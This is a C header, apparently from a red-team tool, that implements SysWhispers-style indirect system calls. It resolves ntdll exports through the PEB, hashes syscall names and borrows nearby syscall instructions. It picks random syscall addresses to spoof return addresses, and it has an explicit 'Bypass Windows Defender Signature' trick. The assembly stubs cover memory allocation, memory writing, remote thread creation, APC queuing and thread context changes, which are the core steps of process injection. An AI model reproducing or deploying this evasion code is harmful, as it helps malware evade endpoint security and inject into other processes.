#pragma once

// Code below is adapted from @modexpblog. Read linked article for more details.
// https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams

#ifndef SW3_HEADER_H_
#define SW3_HEADER_H_

#include <windows.h>

#define SW3_SEED 0x2966FA4D
#define SW3_ROL8(v) (v << 8 | v >> 24)
#define SW3_ROR8(v) (v >> 8 | v << 24)
#define SW3_ROX8(v) ((SW3_SEED % 2) ? SW3_ROL8(v) : SW3_ROR8(v))
#define SW3_MAX_ENTRIES 500
#define SW3_RVA2VA(Type, DllBase, Rva) (Type)((ULONG_PTR) DllBase + Rva)

// Typedefs are prefixed to avoid pollution.

typedef struct _SW3_SYSCALL_ENTRY
{
    DWORD Hash;
    DWORD Address;
        PVOID SyscallAddress;
} SW3_SYSCALL_ENTRY, *PSW3_SYSCALL_ENTRY;

typedef struct _SW3_SYSCALL_LIST
{
    DWORD Count;
    SW3_SYSCALL_ENTRY Entries[SW3_MAX_ENTRIES];
} SW3_SYSCALL_LIST, *PSW3_SYSCALL_LIST;

typedef struct _SW3_PEB_LDR_DATA {
        BYTE Reserved1[8];
        PVOID Reserved2[3];
        LIST_ENTRY InMemoryOrderModuleList;
} SW3_PEB_LDR_DATA, *PSW3_PEB_LDR_DATA;

typedef struct _SW3_LDR_DATA_TABLE_ENTRY {
        PVOID Reserved1[2];
        LIST_ENTRY InMemoryOrderLinks;
        PVOID Reserved2[2];
        PVOID DllBase;
} SW3_LDR_DATA_TABLE_ENTRY, *PSW3_LDR_DATA_TABLE_ENTRY;

typedef struct _SW3_PEB {
        BYTE Reserved1[2];
        BYTE BeingDebugged;
        BYTE Reserved2[1];
        PVOID Reserved3[2];
        PSW3_PEB_LDR_DATA Ldr;
} SW3_PEB, *PSW3_PEB;

typedef struct _PS_ATTRIBUTE
{
    ULONG  Attribute;
    SIZE_T Size;
    union
    {
        ULONG Value;
        PVOID ValuePtr;
    } u1;
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );        \
    (p)->RootDirectory = r;                           \
    (p)->Attributes = a;                              \
    (p)->ObjectName = n;                              \
    (p)->SecurityDescriptor = s;                      \
    (p)->SecurityQualityOfService = NULL;             \
}
#endif

typedef VOID(KNORMAL_ROUTINE) (
    IN PVOID NormalContext,
    IN PVOID SystemArgument1,
    IN PVOID SystemArgument2);

/*
typedef enum _PROCESSINFOCLASS
{
    ProcessBasicInformation = 0,
    ProcessDebugPort = 7,
    ProcessWow64Information = 26,
    ProcessImageFileName = 27,
    ProcessBreakOnTermination = 29
} PROCESSINFOCLASS, *PPROCESSINFOCLASS;
*/

typedef KNORMAL_ROUTINE* PKNORMAL_ROUTINE;

typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T       TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

DWORD SW3_HashSyscall(PCSTR FunctionName);
BOOL SW3_PopulateSyscallList();
EXTERN_C DWORD SW3_GetSyscallNumber(DWORD FunctionHash);
EXTERN_C PVOID SW3_GetSyscallAddress(DWORD FunctionHash);
EXTERN_C PVOID internal_cleancall_wow64_gate(VOID);
#endif
#define JUMPER

#include <stdio.h>

//#define DEBUG

// JUMPER

#ifdef _M_IX86

EXTERN_C PVOID internal_cleancall_wow64_gate(VOID) {
    return (PVOID)__readfsdword(0xC0);
}

// LOCAL_IS_WOW64

#endif

EXTERN_C NTSTATUS NewNtQueryInformationProcess(
    IN HANDLE ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID ProcessInformation,
    IN ULONG ProcessInformationLength,
    OUT PULONG ReturnLength OPTIONAL);

EXTERN_C NTSTATUS NtReadVirtualMemory(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress OPTIONAL,
    OUT PVOID Buffer,
    IN SIZE_T BufferSize,
    OUT PSIZE_T NumberOfBytesRead OPTIONAL);

EXTERN_C NTSTATUS NtProtectVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID * BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect);

EXTERN_C NTSTATUS NtWriteVirtualMemory(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN PVOID Buffer,
    IN SIZE_T NumberOfBytesToWrite,
    OUT PSIZE_T NumberOfBytesWritten OPTIONAL);

EXTERN_C NTSTATUS NtResumeThread(
    IN HANDLE ThreadHandle,
    IN OUT PULONG PreviousSuspendCount OPTIONAL);

EXTERN_C NTSTATUS NewNtClose(
    IN HANDLE Handle);

EXTERN_C NTSTATUS NtOpenProcess(
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN PCLIENT_ID ClientId OPTIONAL);

EXTERN_C NTSTATUS NtAllocateVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID * BaseAddress,
    IN ULONG ZeroBits,
    IN OUT PSIZE_T RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect);

EXTERN_C NTSTATUS NtCreateThreadEx(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN SIZE_T ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL);

EXTERN_C NTSTATUS NewNtWaitForSingleObject(
    IN HANDLE ObjectHandle,
    IN BOOLEAN Alertable,
    IN PLARGE_INTEGER TimeOut OPTIONAL);

EXTERN_C NTSTATUS NtQueueApcThread(
    IN HANDLE ThreadHandle,
    IN PKNORMAL_ROUTINE ApcRoutine,
    IN PVOID ApcArgument1 OPTIONAL,
    IN PVOID ApcArgument2 OPTIONAL,
    IN PVOID ApcArgument3 OPTIONAL);

EXTERN_C NTSTATUS NtAlertResumeThread(
    IN HANDLE ThreadHandle,
    OUT PULONG PreviousSuspendCount OPTIONAL);

EXTERN_C NTSTATUS NtGetContextThread(
    IN HANDLE ThreadHandle,
    IN OUT PCONTEXT ThreadContext);

EXTERN_C NTSTATUS NtSetContextThread(
    IN HANDLE ThreadHandle,
    IN PCONTEXT Context);

EXTERN_C NTSTATUS NtDelayExecution(
    IN BOOLEAN Alertable,
    IN PLARGE_INTEGER DelayInterval);

EXTERN_C NTSTATUS NtFreeVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID * BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG FreeType);

// Code below is adapted from @modexpblog. Read linked article for more details.
// https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams

SW3_SYSCALL_LIST SW3_SyscallList = {0,1};

// SEARCH_AND_REPLACE
#ifdef SEARCH_AND_REPLACE
// THIS IS NOT DEFINED HERE; don't know if I'll add it in a future release
EXTERN void SearchAndReplace(unsigned char[], unsigned char[]);
#endif

DWORD SW3_HashSyscall(PCSTR FunctionName)
{
    DWORD i = 0;
    DWORD Hash = SW3_SEED;

    while (FunctionName[i])
    {
        WORD PartialName = *(WORD*)((ULONG_PTR)FunctionName + i++);
        printf(""); // Bypass Windows Defender Signature
        Hash ^= PartialName + SW3_ROR8(Hash);
    }

    return Hash;
}

#ifndef JUMPER
PVOID SC_Address(PVOID NtApiAddress)
{
    return NULL;
}
#else
PVOID SC_Address(PVOID NtApiAddress)
{
    DWORD searchLimit = 512;
    PVOID SyscallAddress;

   #ifdef _WIN64
    // If the process is 64-bit on a 64-bit OS, we need to search for syscall
    BYTE syscall_code[] = { 0x0f, 0x05, 0xc3 };
    ULONG distance_to_syscall = 0x12;
   #else
    // If the process is 32-bit on a 32-bit OS, we need to search for sysenter
    BYTE syscall_code[] = { 0x0f, 0x34, 0xc3 };
    ULONG distance_to_syscall = 0x0f;
   #endif

  #ifdef _M_IX86
    // If the process is 32-bit on a 64-bit OS, we need to jump to WOW32Reserved
    if (local_is_wow64())
    {
    #ifdef DEBUG
        printf("[+] Running 32-bit app on x64 (WOW64)\n");
    #endif
// JUMP_TO_WOW32Reserved
    }
  #endif

    // we don't really care if there is a 'jmp' between
    // NtApiAddress and the 'syscall; ret' instructions
    SyscallAddress = SW3_RVA2VA(PVOID, NtApiAddress, distance_to_syscall);

    if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
    {
        // we can use the original code for this system call :)
        #if defined(DEBUG)
            printf("Found Syscall Opcodes at address 0x%p\n", SyscallAddress);
        #endif
        return SyscallAddress;
    }

    // the 'syscall; ret' intructions have not been found,
    // we will try to use one near it, similarly to HalosGate

    for (ULONG32 num_jumps = 1; num_jumps < searchLimit; num_jumps++)
    {
        // let's try with an Nt* API below our syscall
        SyscallAddress = SW3_RVA2VA(
            PVOID,
            NtApiAddress,
            distance_to_syscall + num_jumps * 0x20);
        if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
        {
        #if defined(DEBUG)
            printf("Found Syscall Opcodes at address 0x%p\n", SyscallAddress);
        #endif
            return SyscallAddress;
        }

        // let's try with an Nt* API above our syscall
        SyscallAddress = SW3_RVA2VA(
            PVOID,
            NtApiAddress,
            distance_to_syscall - num_jumps * 0x20);
        if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
        {
        #if defined(DEBUG)
            printf("Found Syscall Opcodes at address 0x%p\n", SyscallAddress);
        #endif
            return SyscallAddress;
        }
    }

#ifdef DEBUG
    printf("Syscall Opcodes not found!\n");
#endif

    return NULL;
}
#endif


BOOL SW3_PopulateSyscallList()
{
    // Return early if the list is already populated.
    if (SW3_SyscallList.Count) return TRUE;

    #ifdef _WIN64
    PSW3_PEB Peb = (PSW3_PEB)__readgsqword(0x60);
    #else
    PSW3_PEB Peb = (PSW3_PEB)__readfsdword(0x30);
    #endif
    PSW3_PEB_LDR_DATA Ldr = Peb->Ldr;
    PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
    PVOID DllBase = NULL;

    // Get the DllBase address of NTDLL.dll. NTDLL is not guaranteed to be the second
    // in the list, so it's safer to loop through the full list and find it.
    PSW3_LDR_DATA_TABLE_ENTRY LdrEntry;
    for (LdrEntry = (PSW3_LDR_DATA_TABLE_ENTRY)Ldr->Reserved2[1]; LdrEntry->DllBase != NULL; LdrEntry = (PSW3_LDR_DATA_TABLE_ENTRY)LdrEntry->Reserved1[0])
    {
        DllBase = LdrEntry->DllBase;
        PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
        PIMAGE_NT_HEADERS NtHeaders = SW3_RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
        PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
        DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (VirtualAddress == 0) continue;

        ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)SW3_RVA2VA(ULONG_PTR, DllBase, VirtualAddress);

        // If this is NTDLL.dll, exit loop.
        PCHAR DllName = SW3_RVA2VA(PCHAR, DllBase, ExportDirectory->Name);

        if ((*(ULONG*)DllName | 0x20202020) != 0x6c64746e) continue;
        if ((*(ULONG*)(DllName + 4) | 0x20202020) == 0x6c642e6c) break;
    }

    if (!ExportDirectory) return FALSE;

    DWORD NumberOfNames = ExportDirectory->NumberOfNames;
    PDWORD Functions = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
    PDWORD Names = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
    PWORD Ordinals = SW3_RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);

    // Populate SW3_SyscallList with unsorted Zw* entries.
    DWORD i = 0;
    PSW3_SYSCALL_ENTRY Entries = SW3_SyscallList.Entries;
    do
    {
        PCHAR FunctionName = SW3_RVA2VA(PCHAR, DllBase, Names[NumberOfNames - 1]);

        // Is this a system call?
        if (*(USHORT*)FunctionName == 0x775a)
        {
            Entries[i].Hash = SW3_HashSyscall(FunctionName);
            Entries[i].Address = Functions[Ordinals[NumberOfNames - 1]];
            Entries[i].SyscallAddress = SC_Address(SW3_RVA2VA(PVOID, DllBase, Entries[i].Address));

            i++;
            if (i == SW3_MAX_ENTRIES) break;
        }
    } while (--NumberOfNames);

    // Save total number of system calls found.
    SW3_SyscallList.Count = i;

    // Sort the list by address in ascending order.
    for (DWORD i = 0; i < SW3_SyscallList.Count - 1; i++)
    {
        for (DWORD j = 0; j < SW3_SyscallList.Count - i - 1; j++)
        {
            if (Entries[j].Address > Entries[j + 1].Address)
            {
                // Swap entries.
                SW3_SYSCALL_ENTRY TempEntry;

                TempEntry.Hash = Entries[j].Hash;
                TempEntry.Address = Entries[j].Address;
                TempEntry.SyscallAddress = Entries[j].SyscallAddress;

                Entries[j].Hash = Entries[j + 1].Hash;
                Entries[j].Address = Entries[j + 1].Address;
                Entries[j].SyscallAddress = Entries[j + 1].SyscallAddress;

                Entries[j + 1].Hash = TempEntry.Hash;
                Entries[j + 1].Address = TempEntry.Address;
                Entries[j + 1].SyscallAddress = TempEntry.SyscallAddress;
            }
        }
    }

    return TRUE;
}

EXTERN_C DWORD SW3_GetSyscallNumber(DWORD FunctionHash)
{
    // Ensure SW3_SyscallList is populated.
    if (!SW3_PopulateSyscallList()) return -1;

    for (DWORD i = 0; i < SW3_SyscallList.Count; i++)
    {
        if (FunctionHash == SW3_SyscallList.Entries[i].Hash)
        {
            return i;
        }
    }

    return -1;
}

EXTERN_C PVOID SW3_GetSyscallAddress(DWORD FunctionHash)
{
    // Ensure SW3_SyscallList is populated.
    if (!SW3_PopulateSyscallList()) return NULL;

    for (DWORD i = 0; i < SW3_SyscallList.Count; i++)
    {
        if (FunctionHash == SW3_SyscallList.Entries[i].Hash)
        {
            return SW3_SyscallList.Entries[i].SyscallAddress;
        }
    }

    return NULL;
}

EXTERN_C PVOID SW3_GetRandomSyscallAddress(DWORD FunctionHash)
{
    // Ensure SW3_SyscallList is populated.
    if (!SW3_PopulateSyscallList()) return NULL;

    DWORD index = ((DWORD) rand()) % SW3_SyscallList.Count;

    while (FunctionHash == SW3_SyscallList.Entries[index].Hash){
        // Spoofing the syscall return address
        index = ((DWORD) rand()) % SW3_SyscallList.Count;
    }
    return SW3_SyscallList.Entries[index].SyscallAddress;
}

#define NewNtQueryInformationProcess NewNtQueryInformationProcess
__asm__("NewNtQueryInformationProcess: \n\
    mov [rsp +8], rcx\n\
    mov [rsp+16], rdx\n\
    mov [rsp+24], r8\n\
    mov [rsp+32], r9\n\
    sub rsp, 0x28\n\
    mov ecx, 0x0922889A5\n\
    call SW3_GetRandomSyscallAddress\n\
    mov r15, rax\n\
    mov ecx, 0x0922889A5\n\
    call SW3_GetSyscallNumber\n\
    add rsp, 0x28\n\
    mov rcx, [rsp+8]\n\
    mov rdx, [rsp+16]\n\
    mov r8, [rsp+24]\n\
    mov r9, [rsp+32]\n\
    mov r10, rcx\n\
    jmp r15\n\
");
#define NtReadVirtualMemory NtReadVirtualMemory
__asm__("NtReadVirtualMemory: \n\
    mov [rsp +8], rcx\n\
    mov [rsp+16], rdx\n\
    mov [rsp+24], r8\n\
    mov [rsp+32], r9\n\
    sub rsp, 0x28\n\
    mov ecx, 0x401D34F45\n\
    call SW3_GetRandomSyscallAddress\n\
    mov r15, rax\n\
    mov ecx, 0x01D9D2B13\n\
    call SW3_GetSyscallNumber\n\
    add rsp, 0x28\n\
    mov rcx, [rsp+8]\n\
    mov rdx, [rsp+16]\n\
    mov r8, [rsp+24]\n\
    mov r9, [rsp+32]\n\
    mov r10, rcx\n\
    jmp r15\n\
");
#define NtProtectVirtualMemory NtProtectVirtualMemory
__asm__("NtProtectVirtualMemory: \n\
    mov [rsp +8], rcx\n\
    mov [rsp+16], rdx\n\
    mov [rsp+24], r8\n\
    mov [rsp+32], r9\n\
    sub rsp, 0x28\n\
    mov ecx, 0x0B832AC90\n\
    call SW3_GetRandomSyscallAddress\n\
    mov r15, rax\n\
    mov ecx, 0x0B832AC90\n\
    call SW3_GetSyscallNumber\n\
    add rsp, 0x28\n\
    mov rcx, [rsp+8]\n\
    mov rdx, [rsp+16]\n\
    mov r8, [rsp+24]\n\
    mov r9, [rsp+32]\n\
    mov r10, rcx\n\
    jmp r15\n\
");
#define NtWriteVirtualMemory NtWriteVirtualMemory
__asm__("NtWriteVirtualMemory: \n\
    mov [rsp +8], rcx\n\
    mov [rsp+16], rdx\n\
    mov [rsp+24], r8\n\
    mov [rsp+32], r9\n\
    sub rsp, 0x28\n\
    mov ecx, 0x00D941B1B\n\
    call SW3_GetRandomSyscallAddress\n\
    mov r15, rax\n\
    mov ecx, 0x00D941B1B\n\
    call SW3_GetSyscallNumber\n\
    add rsp, 0x28\n\
    mov rcx, [rsp+8]\n\
    mov rdx, [rsp+16]\n\
    mov r8, [rsp+24]\n\
    mov r9, [rsp+32]\n\
    mov r10, rcx\n\
    jmp r15\n\
");
#define NtResumeThread NtResumeThread
__asm__("NtResumeThread: \n\
    mov [rsp +8], rcx\n\
    mov [rsp+16], rdx\n\
    mov [rsp+24], r8\n\
    mov [rsp+32], r9\n\
    sub rsp, 0x28\n\
    mov ecx, 0x026B22C07\n\
    call SW3_GetRandomSyscallAddress\n\
    mov r15, rax\n\
    mov ecx, 0x026B22C07\n\
    call SW3_GetSyscallNumber\n\
    add rsp, 0x28\n\
    mov rcx, [rsp+8]\n\
    mov rdx, [rsp+16]\n\
    mov r8, [rsp+24]\n\
    mov r9, [rsp+32]\n\
    mov r10, rcx\n\
    jmp r15\n\
");
#define NewNtClose NewNtClose
__asm__("NewNtClose: \n\
    mov [rsp +8], rcx\n\
    mov [rsp+16], rdx\n\
    mov [rsp+24], r8\n\
    mov [rsp+32], r9\n\
    sub rsp, 0x28\n\
    mov ecx, 0x01E893519\n\
    call SW3_GetRandomSyscallAddress\n\
    mov r15, rax\n\
    mov ecx, 0x01E893519\n\
    call SW3_GetSyscallNumber\n\
    add rsp, 0x28\n\
    mov rcx, [rsp+8]\n\
    mov rdx, [rsp+16]\n\
    mov r8, [rsp+24]\n\
    mov r9, [rsp+32]\n\
    mov r10, rcx\n\
    jmp r15\n\
");
#define NtOpenProcess NtOpenProcess
__asm__("NtOpenProcess: \n\
    mov [rsp +8], rcx\n\
    mov [rsp+16], rdx\n\
    mov [rsp+24], r8\n\
    mov [rsp+32], r9\n\
    sub rsp, 0x28\n\
    mov ecx, 0x0612191AC\n\
    call SW3_GetRandomSyscallAddress\n\
    mov r15, rax\n\
    mov ecx, 0x0612191AC\n\
    call SW3_GetSyscallNumber\n\
    add rsp, 0x28\n\
    mov rcx, [rsp+8]\n\
    mov rdx, [rsp+16]\n\
    mov r8, [rsp+24]\n\
    mov r9, [rsp+32]\n\
    mov r10, rcx\n\
    jmp r15\n\
");
#define NtAllocateVirtualMemory NtAllocateVirtualMemory
__asm__("NtAllocateVirtualMemory: \n\
    mov [rsp +8], rcx\n\
    mov [rsp+16], rdx\n\
    mov [rsp+24], r8\n\
    mov [rsp+32], r9\n\
    sub rsp, 0x28\n\
    mov ecx, 0x019910F1F\n\
    call SW3_GetRandomSyscallAddress\n\
    mov r15, rax\n\
    mov ecx, 0x019910F1F\n\
    call SW3_GetSyscallNumber\n\
    add rsp, 0x28\n\
    mov rcx, [rsp+8]\n\
    mov rdx, [rsp+16]\n\
    mov r8, [rsp+24]\n\
    mov r9, [rsp+32]\n\
    mov r10, rcx\n\
    jmp r15\n\
");
#define NtCreateThreadEx NtCreateThreadEx
__asm__("NtCreateThreadEx: \n\
    mov [rsp +8], rcx\n\
    mov [rsp+16], rdx\n\
    mov [rsp+24], r8\n\
    mov [rsp+32], r9\n\
    sub rsp, 0x28\n\
    mov ecx, 0x01C3F5E85\n\
    call SW3_GetRandomSyscallAddress\n\
    mov r15, rax\n\
    mov ecx, 0x01C3F5E85\n\
    call SW3_GetSyscallNumber\n\
    add rsp, 0x28\n\
    mov rcx, [rsp+8]\n\
    mov rdx, [rsp+16]\n\
    mov r8, [rsp+24]\n\
    mov r9, [rsp+32]\n\
    mov r10, rcx\n\
    jmp r15\n\
");
#define NewNtWaitForSingleObject NewNtWaitForSingleObject
__asm__("NewNtWaitForSingleObject: \n\
    mov [rsp +8], rcx\n\
    mov [rsp+16], rdx\n\
    mov [rsp+24], r8\n\
    mov [rsp+32], r9\n\
    sub rsp, 0x28\n\
    mov ecx, 0x0390635A9\n\
    call SW3_GetRandomSyscallAddress\n\
    mov r15, rax\n\
    mov ecx, 0x0390635A9\n\
    call SW3_GetSyscallNumber\n\
    add rsp, 0x28\n\
    mov rcx, [rsp+8]\n\
    mov rdx, [rsp+16]\n\
    mov r8, [rsp+24]\n\
    mov r9, [rsp+32]\n\
    mov r10, rcx\n\
    jmp r15\n\
");
#define NtQueueApcThread NtQueueApcThread
__asm__("NtQueueApcThread: \n\
    mov [rsp +8], rcx\n\
    mov [rsp+16], rdx\n\
    mov [rsp+24], r8\n\
    mov [rsp+32], r9\n\
    sub rsp, 0x28\n\
    mov ecx, 0x00EBA0413\n\
    call SW3_GetRandomSyscallAddress\n\
    mov r15, rax\n\
    mov ecx, 0x00EBA0413\n\
    call SW3_GetSyscallNumber\n\
    add rsp, 0x28\n\
    mov rcx, [rsp+8]\n\
    mov rdx, [rsp+16]\n\
    mov r8, [rsp+24]\n\
    mov r9, [rsp+32]\n\
    mov r10, rcx\n\
    jmp r15\n\
");
#define NtAlertResumeThread NtAlertResumeThread
__asm__("NtAlertResumeThread: \n\
    mov [rsp +8], rcx\n\
    mov [rsp+16], rdx\n\
    mov [rsp+24], r8\n\
    mov [rsp+32], r9\n\
    sub rsp, 0x28\n\
    mov ecx, 0x00AA4083D\n\
    call SW3_GetRandomSyscallAddress\n\
    mov r15, rax\n\
    mov ecx, 0x00AA4083D\n\
    call SW3_GetSyscallNumber\n\
    add rsp, 0x28\n\
    mov rcx, [rsp+8]\n\
    mov rdx, [rsp+16]\n\
    mov r8, [rsp+24]\n\
    mov r9, [rsp+32]\n\
    mov r10, rcx\n\
    jmp r15\n\
");
#define NtGetContextThread NtGetContextThread
__asm__("NtGetContextThread: \n\
    mov [rsp +8], rcx\n\
    mov [rsp+16], rdx\n\
    mov [rsp+24], r8\n\
    mov [rsp+32], r9\n\
    sub rsp, 0x28\n\
    mov ecx, 0x0F668AAC9\n\
    call SW3_GetRandomSyscallAddress\n\
    mov r15, rax\n\
    mov ecx, 0x0F668AAC9\n\
    call SW3_GetSyscallNumber\n\
    add rsp, 0x28\n\
    mov rcx, [rsp+8]\n\
    mov rdx, [rsp+16]\n\
    mov r8, [rsp+24]\n\
    mov r9, [rsp+32]\n\
    mov r10, rcx\n\
    jmp r15\n\
");
#define NtSetContextThread NtSetContextThread
__asm__("NtSetContextThread: \n\
    mov [rsp +8], rcx\n\
    mov [rsp+16], rdx\n\
    mov [rsp+24], r8\n\
    mov [rsp+32], r9\n\
    sub rsp, 0x28\n\
    mov ecx, 0x03A96B7BF\n\
    call SW3_GetRandomSyscallAddress\n\
    mov r15, rax\n\
    mov ecx, 0x03A96B7BF\n\
    call SW3_GetSyscallNumber\n\
    add rsp, 0x28\n\
    mov rcx, [rsp+8]\n\
    mov rdx, [rsp+16]\n\
    mov r8, [rsp+24]\n\
    mov r9, [rsp+32]\n\
    mov r10, rcx\n\
    jmp r15\n\
");
#define NtDelayExecution NtDelayExecution
__asm__("NtDelayExecution: \n\
    mov [rsp +8], rcx\n\
    mov [rsp+16], rdx\n\
    mov [rsp+24], r8\n\
    mov [rsp+32], r9\n\
    sub rsp, 0x28\n\
    mov ecx, 0x04ADF0C0B\n\
    call SW3_GetRandomSyscallAddress\n\
    mov r15, rax\n\
    mov ecx, 0x04ADF0C0B\n\
    call SW3_GetSyscallNumber\n\
    add rsp, 0x28\n\
    mov rcx, [rsp+8]\n\
    mov rdx, [rsp+16]\n\
    mov r8, [rsp+24]\n\
    mov r9, [rsp+32]\n\
    mov r10, rcx\n\
    jmp r15\n\
");
#define NtFreeVirtualMemory NtFreeVirtualMemory
__asm__("NtFreeVirtualMemory: \n\
    mov [rsp +8], rcx\n\
    mov [rsp+16], rdx\n\
    mov [rsp+24], r8\n\
    mov [rsp+32], r9\n\
    sub rsp, 0x28\n\
    mov ecx, 0x00F9D1AF1\n\
    call SW3_GetRandomSyscallAddress\n\
    mov r15, rax\n\
    mov ecx, 0x00F9D1AF1\n\
    call SW3_GetSyscallNumber\n\
    add rsp, 0x28\n\
    mov rcx, [rsp+8]\n\
    mov rdx, [rsp+16]\n\
    mov r8, [rsp+24]\n\
    mov r9, [rsp+32]\n\
    mov r10, rcx\n\
    jmp r15\n\
");